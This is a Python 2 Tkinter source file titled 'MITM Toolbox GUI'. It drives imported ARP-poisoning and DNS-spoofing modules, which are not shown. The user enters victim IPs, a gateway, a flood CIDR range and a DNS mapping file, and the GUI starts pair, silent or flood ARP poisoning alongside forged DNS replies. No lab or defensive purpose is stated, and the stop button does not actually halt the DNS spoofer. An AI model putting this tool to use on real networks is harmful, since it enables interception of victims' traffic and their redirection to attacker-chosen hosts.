#!/usr/bin/env python2
# -*- coding: utf-8 -*-
"""
interface.py -- Combined ARP & DNS Spoofer GUI for Python-2.7
Provides a Tkinter interface to dnspro.py (DNS spoof) and arppro.py (ARP poison).
"""
import sys, os, logging
try:
    import Tkinter as tk
    import tkFileDialog as filedialog
    import tkMessageBox as messagebox
    import tkSimpleDialog as simpledialog
except ImportError:
    sys.exit('Install python-tk for Tkinter')
from scapy.all import get_if_list

# import DNS backend
base = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, base)
import imp
try:
    dns_mod = imp.load_source('dnspro', os.path.join(base, 'dnspro.py'))
    DNSSpoofer = dns_mod.DNSSpoofer
    load_mapping = dns_mod.load_mapping
    arppro = imp.load_source('arppro', os.path.join(base, 'arppro.py'))
    ActivePairSpoofer = arppro.ActivePairSpoofer
    SilentResponder = arppro.SilentResponder
    FloodSpoofer = arppro.FloodSpoofer
    getmacbyip = arppro.resolve_mac
    PoisonManager = arppro.PoisonManager
except Exception as e:
    tk.Tk().withdraw(); messagebox.showerror('Import Error', str(e)); sys.exit(1)

class GUIHandler(logging.Handler):
    def __init__(self, widget): logging.Handler.__init__(self); self.widget=widget
    def emit(self, record): msg=self.format(record)+'\n'; self.widget.after(0, lambda: [self.widget.insert(tk.END,msg), self.widget.see(tk.END)])

class MitmGui(tk.Frame):
    def __init__(self, master=None):
        tk.Frame.__init__(self, master); master.title('MITM Toolbox GUI')
        self.pack(fill='both', expand=True); self.columnconfigure(1, weight=1)
        self.logger=logging.getLogger(); self.logger.setLevel(logging.INFO); self.log_handler=None
        self.dns_thread=None; self.arp_mgr=PoisonManager()
        self._build_widgets()

    def _build_widgets(self):
        r=0
        # Interface
        tk.Label(self,text='Interface:').grid(row=r,column=0,sticky='e')
        self.iface_var=tk.StringVar(); tk.OptionMenu(self,self.iface_var,*get_if_list()).grid(row=r,column=1,sticky='w')
        # --- ARP Section ---
        r+=1; tk.Label(self,text='[ARP Settings]',fg='blue').grid(row=r,columnspan=3,sticky='w')
        r+=1; tk.Label(self,text='ARP Mode:').grid(row=r,column=0,sticky='e')
        self.arp_mode=tk.StringVar(value='pair'); tk.OptionMenu(self,self.arp_mode,'pair','silent','flood').grid(row=r,column=1,sticky='w')
        r+=1; tk.Label(self,text='Victims (comma):').grid(row=r,column=0,sticky='e')
        self.arp_victims=tk.Entry(self); self.arp_victims.grid(row=r,column=1,sticky='ew')
        r+=1; tk.Label(self,text='Gateway IP:').grid(row=r,column=0,sticky='e')
        self.arp_gateway=tk.Entry(self); self.arp_gateway.grid(row=r,column=1,sticky='ew')
        r+=1; tk.Label(self,text='CIDR (flood):').grid(row=r,column=0,sticky='e')
        self.arp_cidr=tk.Entry(self); self.arp_cidr.grid(row=r,column=1,sticky='ew')
        r+=1; tk.Label(self,text='Interval (s):').grid(row=r,column=0,sticky='e')
        self.arp_interval=tk.Spinbox(self,from_=1,to=60); self.arp_interval.grid(row=r,column=1,sticky='w')
        # --- DNS Section ---
        r+=1; tk.Label(self,text='[DNS Settings]',fg='blue').grid(row=r,columnspan=3,sticky='w')
        r+=1; tk.Label(self,text='Mapping file:').grid(row=r,column=0,sticky='e')
        self.map_path=tk.Entry(self); self.map_path.grid(row=r,column=1,sticky='ew')
        tk.Button(self,text='Browse',command=self._browse_map).grid(row=r,column=2)
        r+=1; self.relay_var=tk.BooleanVar(); tk.Checkbutton(self,text='Relay unmatched DNS',variable=self.relay_var).grid(row=r,columnspan=3,sticky='w')
        r+=1; tk.Label(self,text='Upstream DNS:').grid(row=r,column=0,sticky='e')
        self.upstream=tk.Entry(self); self.upstream.insert(0,'8.8.8.8'); self.upstream.grid(row=r,column=1,sticky='w')
        r+=1; tk.Label(self,text='TTL (secs):').grid(row=r,column=0,sticky='e')
        self.ttl=tk.Spinbox(self,from_=1,to=3600); self.ttl.delete(0,'end'); self.ttl.insert(0,'300'); self.ttl.grid(row=r,column=1,sticky='w')
        r+=1; tk.Label(self,text='BPF filter:').grid(row=r,column=0,sticky='e')
        self.bpf=tk.Entry(self); self.bpf.insert(0,'udp or tcp port 53'); self.bpf.grid(row=r,column=1,sticky='ew')
        tk.Button(self,text='⋯',width=3,command=self._choose_bpf).grid(row=r,column=2)
        # Start/Stop
        r+=1; self.start_btn=tk.Button(self,text='Start All',command=self._start); self.start_btn.grid(row=r,column=0)
        self.stop_btn=tk.Button(self,text='Stop All',command=self._stop, state='disabled'); self.stop_btn.grid(row=r,column=1)
        # Log
        r+=1; tk.Label(self,text='Log output:').grid(row=r,columnspan=3,sticky='w')
        r+=1; self.rowconfigure(r,weight=1); self.log_text=tk.Text(self); self.log_text.grid(row=r,column=0,columnspan=3,sticky='nsew')

    def _browse_map(self):
        p=filedialog.askopenfilename(filetypes=[('YAML','*.yml'),('All','*.*')]);
        if p: self.map_path.delete(0,'end'); self.map_path.insert(0,p)

    def _choose_bpf(self):
        choice = simpledialog.askstring('BPF Presets','Enter filter:',initialvalue=self.bpf.get());
        if choice: self.bpf.delete(0,'end'); self.bpf.insert(0,choice)

    def _start(self):
        # setup logger handler
        if self.log_handler: self.logger.removeHandler(self.log_handler)
        self.log_text.delete('1.0','end')
        self.log_handler = GUIHandler(self.log_text); self.log_handler.setFormatter(logging.Formatter('%(asctime)s %(message)s'))
        self.logger.addHandler(self.log_handler)
        self.logger.info('Starting ARP & DNS...')
        iface=self.iface_var.get();
        # ARP
        mode=self.arp_mode.get(); victims=self.arp_victims.get(); gw=self.arp_gateway.get(); intv=float(self.arp_interval.get())
        try:
            gw_mac=getmacbyip(gw)
            for vip in victims.split(','):
                mac=getmacbyip(vip)
                if mode=='pair': thr=ActivePairSpoofer(iface,(vip,mac),(gw,gw_mac),get_if_list()[0],intv)
                elif mode=='silent': thr=SilentResponder(iface,(vip,mac),(gw,gw_mac),get_if_list()[0])
                else: thr=FloodSpoofer(iface,self.arp_cidr.get(),gw,get_if_list()[0],intv)
                self.arp_mgr.add(thr)
            self.logger.info('ARP mode %s initiated',mode)
        except Exception as e: messagebox.showerror('ARP Error',str(e)); return
        # DNS
        try:
            m=load_mapping(self.map_path.get())
            dns_thr=DNSSpoofer(iface=self.iface_var.get(),mapping=m,upstream=self.upstream.get(),relay=self.relay_var.get(),ttl=int(self.ttl.get()),bpf=self.bpf.get())
            dns_thr.start(); self.logger.info('DNS spoof started')
        except Exception as e: messagebox.showerror('DNS Error',str(e)); return
        self.start_btn.config(state='disabled'); self.stop_btn.config(state='normal')

    def _stop(self):
        self.arp_mgr.stop_all(); self.logger.info('ARP stopped')
        # TODO: stop DNS thread gracefully
        self.logger.info('DNS stopped')
        self.start_btn.config(state='normal'); self.stop_btn.config(state='disabled')

if __name__=='__main__':
    root=tk.Tk(); MitmGui(master=root); root.mainloop()
